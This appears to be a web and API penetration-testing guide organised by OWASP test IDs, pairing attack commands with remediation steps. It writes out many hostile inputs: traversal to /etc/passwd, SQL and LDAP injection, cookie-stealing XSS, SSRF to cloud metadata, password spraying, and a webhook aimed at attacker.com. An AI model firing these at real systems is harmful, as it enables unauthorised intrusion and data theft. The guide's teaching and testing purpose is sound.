# OWASP Testing Guide — Web & API Assessment Procedures

Comprehensive testing procedures aligned with OWASP Web Security Testing Guide (WSTG) v4.2+ and OWASP API Security Top 10. Each test includes step-by-step instructions, tool commands, verification procedures, and detailed remediation with exact commands.

## Information Gathering (WSTG-INFO)

### WSTG-INFO-01: Conduct Search Engine Discovery

**Test**: Find exposed information via search engines and public sources.

```bash
# Google dorking
site:target.com filetype:pdf
site:target.com intitle:"index of"
site:target.com inurl:admin
site:target.com "password" filetype:log

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u

# Wayback Machine
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=original&collapse=urlkey"
```

**Remediation (Step-by-Step)**:
1. Remove sensitive files from webroot: `rm /var/www/html/admin/backups/` or restrict access
2. Add `robots.txt` for non-sensitive paths: `Disallow: /admin/`
3. Add `X-Robots-Tag: noindex, noarchive` HTTP header for sensitive pages
4. Request removal from search engines: Use Google Search Console → Removal Tool
5. Remove cached copies: Request cache purge from Wayback Machine where applicable
6. Verify: `site:target.com sensitive-term` returns no sensitive results

### WSTG-INFO-02: Fingerprint Web Server

```bash
secator x httpx target.com -td -server -status-code -title
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-aspnet-version"
```

**Remediation (Step-by-Step)**:
1. Remove Server header: Apache → `ServerTokens Prod`, Nginx → `server_tokens off;`
2. Remove X-Powered-By: PHP → `expose_php = Off` in php.ini
3. Remove X-AspNet-Version: In web.config: `<httpRuntime enableVersionHeader="false" />`
4. Apply security headers: `Header set X-Content-Type-Options "nosniff"`
5. Verify: `curl -sI https://target.com | grep -i server` returns minimal or no version info

### WSTG-INFO-03: Review Webapp Metafiles

```bash
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
curl -s https://target.com/.well-known/security.txt
curl -s https://target.com/.env
curl -s https://target.com/.git/HEAD
```

**Remediation (Step-by-Step)**:
1. Remove `.env`, `.git`, backup files from webroot: `rm -rf /var/www/html/.git /var/www/html/.env`
2. Block access in web server config:
   - Nginx: `location ~ /\.(git|env) { deny all; }`
   - Apache: `RedirectMatch 404 /\.git` and `RedirectMatch 404 /\.env`
3. Use `robots.txt` only for non-sensitive paths (never rely on it for security)
4. Verify: `curl -s https://target.com/.git/HEAD` returns 404

### WSTG-INFO-04: Enumerate Applications on Webserver

```bash
secator x httpx target.com -td -vhost -title -status-code
secator x ffuf https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.target.com"
```

**Remediation (Step-by-Step)**:
1. Disable unused virtual hosts and applications
2. Restrict access to internal apps via IP allowlist or VPN
3. Remove default pages: Delete Apache/Nginx/IIS default welcome pages
4. Verify: Only expected applications respond; internal apps return 403 from external

### WSTG-INFO-05: Review Webpage Content for Info Leakage

```bash
# Comments in source
curl -s https://target.com | grep -iE "<!--|password|token|api.key|secret|debug"

# JavaScript analysis
secator x katana https://target.com -jc -js-crawl -d 3 -json | jq '.endpoint' | sort -u
```

**Remediation (Step-by-Step)**:
1. Remove HTML comments containing sensitive info from production code
2. Strip debug info from JavaScript: Use `terser --compress --mangle` or Webpack production mode
3. Move API keys to server-side environment variables
4. Implement Content Security Policy: `Content-Security-Policy: default-src 'self'`
5. Verify: View page source → no sensitive comments, keys, or debug output

## Configuration and Deploy Management Testing (WSTG-CONF)

### WSTG-CONF-01: Test Network Infrastructure Configuration

```bash
secator x nmap target -sV -sC -p 80,443,8080,8443 -json
curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet|strict-transport"
```

**Remediation (Step-by-Step)**:
1. Enable HSTS: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
2. Enable CSP: `Content-Security-Policy: default-src 'self'; script-src 'self'`
3. Enable X-Frame-Options: `X-Frame-Options: DENY`
4. Enable X-Content-Type-Options: `X-Content-Type-Options: nosniff`
5. Enable Referrer-Policy: `Referrer-Policy: strict-origin-when-cross-origin`
6. Enable Permissions-Policy: `Permissions-Policy: camera=(), microphone=(), geolocation=()`
7. Verify: `curl -sI https://target.com` shows all security headers

### WSTG-CONF-02: Test Application Platform Configuration

```bash
# Default credentials
curl -s -u admin:admin https://target.com/admin/
curl -s -u admin:password https://target.com/admin/
# Default paths
secator x ffuf https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,401,403
```

**Remediation (Step-by-Step)**:
1. Change all default credentials immediately after deployment
2. Delete default admin accounts or rename: `UPDATE users SET username='unique_admin' WHERE username='admin';`
3. Enforce strong passwords: minimum 12 chars, complexity, no reuse
4. Remove default content: Delete `/docs/`, `/examples/`, `/manager/html`
5. Restrict admin panels to internal IPs or VPN
6. Verify: Default credentials fail; admin panel returns 403 from external

### WSTG-CONF-05: Review Old Backup and Unreferenced Files

```bash
secator x ffuf https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt -mc 200
# Check for common backup patterns
curl -s https://target.com/web.config.bak
curl -s https://target.com/db.sql
curl -s https://target.com/backup.zip
curl -s https://target.com/www.tar.gz
```

**Remediation (Step-by-Step)**:
1. Remove all backup files from webroot: `find /var/www -name "*.bak" -o -name "*.old" -o -name "*.zip" -delete`
2. Block backup file extensions:
   - Nginx: `location ~* \.(bak|old|zip|tar|gz|sql|conf)$ { deny all; }`
   - Apache: `FilesMatch "\.(bak|old|zip|sql|conf)$"> Require all denied </FilesMatch>`
3. Store backups in non-web-accessible location: `/var/backups/` not `/var/www/`
4. Verify: `curl -s https://target.com/backup.zip` returns 404

## Identity Management Testing (WSTG-IDNT)

### WSTG-IDNT-01: Test Account Provisioning

```bash
# Try registering with existing username
curl -s -X POST https://target.com/api/register -d '{"username":"admin","email":"admin@target.com","password":"TestPass123!"}'

# Try registering with privileged role
curl -s -X POST https://target.com/api/register -d '{"username":"testuser","email":"test@test.com","password":"TestPass123!","role":"admin"}'
```

**Remediation (Step-by-Step)**:
1. Validate registration server-side: Reject duplicate usernames/emails
2. Never accept role from client: Set default role to lowest privilege in backend code
3. Implement email verification: Send confirmation link before activating account
4. Add rate limiting: Maximum 3 registration attempts per IP per hour
5. Implement CAPTCHA on registration form
6. Verify: Duplicate registration returns 409; role parameter ignored; email verification required

### WSTG-IDNT-04: Test Account Enumeration

```bash
# Username enumeration via login
curl -s -X POST https://target.com/login -d '{"username":"admin","password":"wrong"}' 
curl -s -X POST https://target.com/login -d '{"username":"nonexistent","password":"wrong"}'

# Compare responses for timing differences
time curl -s -X POST https://target.com/login -d '{"username":"admin","password":"wrong"}'
time curl -s -X POST https://target.com/login -d '{"username":"nonexistent","password":"wrong"}'
```

**Remediation (Step-by-Step)**:
1. Use generic error messages: "Invalid username or password" for both cases
2. Normalize response times: Add random delay to all auth attempts
3. Return same HTTP status code for valid/invalid users (e.g., 401)
4. Implement account lockout with generic messaging
5. Verify: Login error messages are identical regardless of username validity

## Authentication Testing (WSTG-ATHN)

### WSTG-ATHN-01: Test Credentials Transport

```bash
# Check if login uses HTTPS
curl -s -v http://target.com/login 2>&1 | grep -i "location\|http/"
# Check for mixed content
curl -s https://target.com/login | grep -iE 'src="http:|href="http:"'
```

**Remediation (Step-by-Step)**:
1. Force HTTPS on all auth endpoints: `RedirectMatch permanent ^/login https://target.com/login`
2. Enable HSTS (see WSTG-CONF-01)
3. Fix mixed content: Replace all `http://` links with `https://` or protocol-relative URLs
4. Set Secure flag on cookies: `Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict`
5. Verify: `curl -s -v http://target.com/login` redirects to HTTPS

### WSTG-ATHN-02: Test Default Credentials

```bash
# Password spraying with common defaults
nxc ssh target -u admin -p 'admin'
nxc ssh target -u root -p 'root'
nxc ssh target -u admin -p 'password'
# Web default creds
secator x nuclei target.com -tags default-login
```

**Remediation (Step-by-Step)**:
1. Force password change on first login
2. Enforce minimum 12-character passwords with complexity
3. Implement account lockout: 5 failed attempts → 30 min lockout
4. Check against breached password lists (HaveIBeenPwned API)
5. Disable accounts after 90 days of inactivity
6. Verify: All default credentials fail; new users must change password

### WSTG-ATHN-03: Test Weak Lockout Mechanism

```bash
# Test lockout by sending multiple failed attempts
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/login -d '{"username":"testuser","password":"wrong'$i'"}'
  echo "Attempt $i"
done
```

**Remediation (Step-by-Step)**:
1. Implement account lockout: Lock after 5 failed attempts for 30 minutes
2. Exponential backoff: 1st lock 5min, 2nd lock 15min, 3rd lock 60min
3. Notify user via email after lockout
4. Require admin unlock or time-based auto-unlock
5. Log all failed attempts with source IP
6. Verify: After 5 failed attempts, account is locked; further attempts return "Account locked"

### WSTG-ATHN-07: Test Password Reset

```bash
# Predictable reset tokens
curl -s -X POST https://target.com/api/reset -d '{"email":"victim@target.com"}'
# Token reuse test
curl -s -X POST https://target.com/api/reset/confirm -d '{"token":"PREVIOUS_TOKEN","password":"NewPass123!"}'
# User enumeration via reset
curl -s -X POST https://target.com/api/reset -d '{"email":"known@target.com"}'
curl -s -X POST https://target.com/api/reset -d '{"email":"unknown@target.com"}'
```

**Remediation (Step-by-Step)**:
1. Generate cryptographically random reset tokens: `secrets.token_urlsafe(32)` (Python) or `crypto.randomBytes(32).toString('hex')` (Node)
2. Set token expiration: Maximum 15 minutes, then invalidate
3. Single-use tokens: Delete or mark used after first successful reset
4. Generic response: "If the email exists, a reset link has been sent"
5. Send notification email when password is changed
6. Verify: Old tokens are rejected; reset response is generic; token expires after 15min

## Authorization Testing (WSTG-ATHZ)

### WSTG-ATHZ-01: Test Directory Traversal

```bash
curl -s "https://target.com/files?path=../../../etc/passwd"
curl -s "https://target.com/files?path=....//....//....//etc/passwd"
curl -s "https://target.com/files?path=..%252f..%252f..%252fetc/passwd"
```

**Remediation (Step-by-Step)**:
1. Validate and sanitize file paths: `os.path.basename(user_input)` in Python
2. Use chroot or restricted directory: `realpath()` must start with allowed base path
3. Never pass user input directly to filesystem operations
4. Use allowlist of permitted files: Only allow specific filenames, not paths
5. Verify: `curl "https://target.com/files?path=../../../etc/passwd"` returns 400 or 403

### WSTG-ATHZ-02: Test Bypassing Authorization Schema

```bash
# Horizontal bypass — access other user's data
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/users/USER_B/profile
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/admin/dashboard

# Force browsing
curl -s https://target.com/admin/dashboard -H "Cookie: session=standard_user_session"
```

**Remediation (Step-by-Step)**:
1. Implement server-side authorization checks on every endpoint
2. Use role-based access control (RBAC) middleware: Verify `req.user.role` before processing
3. Apply attribute-based access control (ABAC) for fine-grained permissions
4. Never trust client-side routing for authorization
5. Log all unauthorized access attempts
6. Verify: Accessing other user's data returns 403; admin panel returns 403 for standard users

### WSTG-ATHZ-04: Test Insecure Direct Object References

```bash
# IDOR via predictable IDs
curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/documents/1
curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/documents/2
# IDOR via UUID (test if UUIDs are enumerable)
curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000
```

**Remediation (Step-by-Step)**:
1. Validate ownership server-side: Check `document.user_id == current_user.id`
2. Use indirect references: Map user-visible IDs to internal IDs via server-side lookup
3. Apply field-level security: Only return fields the user is authorized to see
4. Implement audit logging for sensitive data access
5. Verify: Accessing another user's document returns 403 Forbidden

## Session Management Testing (WSTG-SESS)

### WSTG-SESS-01: Test Session Management Schema

```bash
# Check cookie flags
curl -sI https://target.com/login | grep -i "set-cookie"
# Session fixation test
curl -s -c cookies.txt https://target.com/login
curl -s -b cookies.txt -X POST https://target.com/api/login -d 'user=admin&pass=valid'
# Compare pre/post login session IDs
```

**Remediation (Step-by-Step)**:
1. Regenerate session ID after login: `session.regenerate_id()` or equivalent
2. Set Secure flag: `Set-Cookie: session=abc; Secure`
3. Set HttpOnly flag: `Set-Cookie: session=abc; HttpOnly`
4. Set SameSite=Strict: `Set-Cookie: session=abc; SameSite=Strict`
5. Set appropriate expiration: 30 minutes idle timeout for sensitive apps
6. Verify: Pre-login cookie is invalid after login; all flags present

### WSTG-SESS-02: Test Cookie Attributes

```bash
curl -sI https://target.com | grep -i "set-cookie"
# Expected: Secure; HttpOnly; SameSite=Strict/Lax; Path=/
```

**Remediation (Step-by-Step)**:
1. Add Secure flag: Prevents transmission over HTTP
2. Add HttpOnly: Prevents JavaScript access (`document.cookie`)
3. Add SameSite=Strict: Prevents CSRF via cross-origin requests
4. Set Path=/ to limit cookie scope
5. Set Domain attribute explicitly to prevent subdomain sharing
6. Verify: `curl -sI https://target.com | grep Set-Cookie` shows all flags

## Input Validation Testing (WSTG-INPV)

### WSTG-INPV-01: Test Reflected XSS

```bash
# Basic reflected XSS test
curl -s "https://target.com/search?q=<script>alert(1)</script>"
curl -s "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
# Secator automated XSS
secator x dalfox https://target.com/search?q=FUZZ -b https://callback.example.com
```

**Remediation (Step-by-Step)**:
1. HTML-encode all user input on output: Use `html.escape()` (Python), `htmlspecialchars()` (PHP), or framework auto-escaping
2. Implement Content Security Policy: `Content-Security-Policy: default-src 'self'; script-src 'self'`
3. Input validation: Allowlist expected characters per field
4. HTTP-only cookies for session tokens
5. Verify: `<script>alert(1)</script>` is rendered as escaped text, not executed

### WSTG-INPV-02: Test Stored XSS

```bash
# Submit XSS payload in stored fields
curl -s -X POST https://target.com/api/comments -H "Authorization: Bearer TOKEN" \
  -d '{"content":"<script>alert(document.cookie)</script>"}'
# Verify persistence
curl -s https://target.com/api/comments | jq '.[].content'
```

**Remediation (Step-by-Step)**:
1. Sanitize input on storage: Strip or encode HTML before database insert
2. Sanitize on output: Even if stored unsanitized, encode on display
3. Use allowlist HTML sanitization (if rich text needed): `bleach.clean(user_input, tags=['b','i','a'])`
4. CSP headers as defense-in-depth
5. Verify: Stored XSS payload renders as escaped text when viewed

### WSTG-INPV-03: Test SQL Injection

```bash
# Authentication bypass
curl -s -X POST https://target.com/api/login -d "username=admin'--&password=x"

# Error-based SQLi
curl -s "https://target.com/api/users?id=1' OR '1'='1"

# Time-based blind SQLi
curl -s "https://target.com/api/users?id=1'; WAITFOR DELAY '0:0:5'--"

# Automated with Secator
secator x nuclei target.com -tags sqli -severity critical,high
```

**Remediation (Step-by-Step)**:
1. Use parameterized queries everywhere:
   - Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
   - Java: `PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");`
   - PHP: `$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');`
2. Use ORM with proper query building (never raw string interpolation)
3. Input validation: Validate types, ranges, formats
4. Least-privilege database accounts: Application DB user should not have `DROP`, `ALTER` privileges
5. Web Application Firewall (WAF) as defense-in-depth
6. Verify: `' OR '1'='1` returns error or empty result, not all records

### WSTG-INPV-05: Test LDAP Injection

```bash
curl -s "https://target.com/api/search?name=*)(|(cn=*" 
curl -s "https://target.com/api/login" -d "user=admin)(&))&password=x"
```

**Remediation (Step-by-Step)**:
1. Escape LDAP special characters: `\`, `*`, `(`, `)`, are escaped with backslash
2. Use parameterized LDAP queries: `conn.search_s(base, scope, filterstr='(cn=%s)' % ldap.escape(user_input))`
3. Input validation: Allowlist expected character sets per field
4. Verify: `*)(|(cn=*` returns no results or error, not all LDAP entries

### WSTG-INPV-11: Test Code Injection

```bash
# Server-Side Template Injection (SSTI)
curl -s "https://target.com/search?q={{7*7}}"
curl -s "https://target.com/search?q={{config}}"
curl -s "https://target.com/search?q=\${7*7}"
```

**Remediation (Step-by-Step)**:
1. Never use `eval()`, `exec()`, or template engines with user input in expression context
2. Use sandboxed template engines: Jinja2 with `SandboxedEnvironment`
3. Input validation: Reject `{`, `}`, `${`, `<%`, `%>` in user input where not expected
4. Run application with least privilege
5. Verify: `{{7*7}}` renders as literal text, not `49`

## API Security Testing (OWASP API Top 10)

### API1: Broken Object Level Authorization

```bash
# Access other user's resources
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://api.target.com/v1/users/USER_B_ID
curl -s -H "Authorization: Bearer USER_A_TOKEN" https://api.target.com/v1/orders/12345
```

**Remediation (Step-by-Step)**:
1. Validate object ownership in every endpoint handler
2. Use UUIDs instead of sequential IDs (but still validate ownership)
3. Implement middleware: `if resource.owner_id != current_user.id: return 403`
4. Apply field-level filtering: Only return fields the user can see
5. Verify: Accessing another user's resource returns 403 Forbidden

### API2: Broken Authentication

```bash
# Test API key as only auth mechanism
curl -s -H "X-API-Key: predictable-key" https://api.target.com/v1/users
# Test missing rate limiting
for i in $(seq 1 1000); do
  curl -s -o /dev/null -w "%{http_code}" https://api.target.com/v1/login -d '{"user":"admin","pass":"guess'$i'"}'
done
```

**Remediation (Step-by-Step)**:
1. Use OAuth 2.0 / OpenID Connect with proper token validation
2. Implement rate limiting: 100 requests/minute per API key, 10 login attempts/5 minutes
3. Short-lived access tokens (15 min) with refresh tokens
4. Validate token signature and claims on every request
5. Verify: 1000 rapid requests return 429 Too Many Requests after limit

### API3: Broken Object Property Level Authorization

```bash
# Mass assignment — set role via API
curl -s -X PATCH -H "Authorization: Bearer TOKEN" https://api.target.com/v1/users/me \
  -d '{"email":"new@email.com","role":"admin","is_admin":true}'
```

**Remediation (Step-by-Step)**:
1. Use DTOs (Data Transfer Objects): Only allow specific fields in input schemas
2. Explicit allowlist: `allowed_fields = ['email', 'name']` — ignore everything else
3. Never bind entire request body to model: Use `request.only(['email', 'name'])` pattern
4. Validate and sanitize every input field
5. Verify: `role` and `is_admin` parameters are ignored; only allowed fields updated

### API4: Unrestricted Resource Consumption

```bash
# Pagination bypass
curl -s "https://api.target.com/v1/users?limit=1000000"
# Heavy query
curl -s -X POST https://api.target.com/v1/graphql -d '{"query":"{users(first:100000){edges{node{posts{comments}}}}}"}'
```

**Remediation (Step-by-Step)**:
1. Enforce pagination: Maximum 100 records per page, default 20
2. Set query complexity limits for GraphQL: `max_complexity = 500`
3. Implement rate limiting: 100 req/min for standard tier
4. Set response payload size limits: Maximum 1MB per response
5. Add compute time limits: Kill queries exceeding 5 seconds
6. Verify: `limit=1000000` returns max 100 records; heavy queries are rejected

### API5: Broken Function Level Authorization

```bash
# Access admin endpoint as standard user
curl -s -H "Authorization: Bearer STANDARD_USER_TOKEN" https://api.target.com/v1/admin/users
curl -s -X DELETE -H "Authorization: Bearer STANDARD_USER_TOKEN" https://api.target.com/v1/admin/users/123
```

**Remediation (Step-by-Step)**:
1. Implement function-level authorization middleware
2. Separate admin and user API routes with distinct auth requirements
3. Apply role checks: `if user.role not in ['admin']: return 403`
4. Use route-level decorators: `@require_role('admin')` on all admin endpoints
5. Verify: Standard user accessing admin endpoints returns 403 Forbidden

### API7: Server-Side Request Forgery

```bash
# SSRF via URL parameter
curl -s "https://api.target.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://api.target.com/v1/fetch?url=http://localhost:6379/"
curl -s "https://api.target.com/v1/webhook?url=http://internal-service:8080/admin"
```

**Remediation (Step-by-Step)**:
1. Validate URL allowlist: Only permit specific domains and schemes (https only)
2. Block private/internal IP ranges:
   ```python
   import ipaddress
   for network in [ipaddress.ip_network('10.0.0.0/8'), ipaddress.ip_network('172.16.0.0/12'),
                   ipaddress.ip_network('192.168.0.0/16'), ipaddress.ip_network('169.254.0.0/16'),
                   ipaddress.ip_network('127.0.0.0/8')]:
       if target_ip in network: raise ValueError("Internal IP blocked")
   ```
3. Block non-HTTPS schemes: Reject `file://`, `gopher://`, `dict://`
4. Use separate network segment for outbound requests
5. Verify: Requests to internal IPs/schemes return 400 Bad Request

### API8: Security Misconfiguration

```bash
# Check for debug endpoints
curl -s https://api.target.com/debug
curl -s https://api.target.com/swagger-ui.html
curl -s https://api.target.com/actuator/env
curl -s https://api.target.com/_profiler
# Check HTTP methods
curl -s -X OPTIONS https://api.target.com/ -v
curl -s -X TRACE https://api.target.com/
```

**Remediation (Step-by-Step)**:
1. Disable debug mode in production: `DEBUG=False`, `NODE_ENV=production`
2. Remove Swagger/OpenAPI docs from production or restrict to internal IPs
3. Disable Spring Boot Actuator endpoints or restrict access
4. Remove default error pages that leak stack traces
5. Disable TRACE and other unnecessary HTTP methods
6. Verify: `/debug`, `/swagger-ui.html`, `/actuator/env` return 404 or 403

### API9: Improper Inventory Management

```bash
# Discover old API versions
curl -s https://api.target.com/v1/users
curl -s https://api.target.com/v2/users  
curl -s https://api.target.com/v3/users
# Check for undocumented endpoints
secator x ffuf https://api.target.com/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

**Remediation (Step-by-Step)**:
1. Decommission old API versions: Redirect to current version or return 410 Gone
2. Document all API endpoints in centralized inventory
3. Use API gateway for version management and deprecation
4. Monitor for shadow APIs: Run continuous API discovery scans
5. Verify: Old API versions return 410 Gone or redirect to current version

### API10: Unsafe Consumption of Third-Party APIs

```bash
# Test if target trusts third-party API responses without validation
curl -s "https://api.target.com/v1/integration/webhook" -d '{"url":"https://attacker.com/capture"}'
# Test if third-party API responses are properly sanitized
curl -s "https://api.target.com/v1/enrich?email=test+<script>alert(1)</script>@target.com"
```

**Remediation (Step-by-Step)**:
1. Validate all third-party API responses before processing
2. Sanitize data from third-party APIs: Apply same input validation as user input
3. Use allowlists for third-party API endpoints
4. Implement circuit breakers: Fail gracefully if third-party API is unavailable
5. Verify: Third-party API data containing XSS/SQLi payloads is sanitized before use

## GraphQL-Specific Testing

```bash
# Introspection query (information disclosure)
curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# Batch query abuse
curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},...]'

# Depth bomb
curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{users{friends{friends{friends{friends{id}}}}}}"}'
```

**Remediation (Step-by-Step)**:
1. Disable introspection in production: Apollo `introspection: false`, custom directive
2. Implement query depth limiting: Maximum depth of 5-7
3. Implement query complexity analysis: Maximum complexity score per query
4. Rate limit queries: 100 queries/minute per user
5. Disable batch queries or limit batch size to 5
6. Verify: Introspection returns error; depth > 7 rejected; batch > 5 rejected

## gRPC-Specific Testing

```bash
# Service enumeration
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe ServiceName

# Unauthenticated access
grpcurl -plaintext target.com:50051 ServiceName/MethodName -d '{"id": 1}'
```

**Remediation (Step-by-Step)**:
1. Enable TLS: Configure server certificates, reject plaintext connections
2. Implement authentication: Use gRPC interceptors for token validation
3. Authorize per method: Check caller permissions in each method handler
4. Validate all messages: Use protobuf validation (protoc-gen-validate)
5. Verify: Plaintext connection refused; unauthenticated calls return UNAUTHENTICATED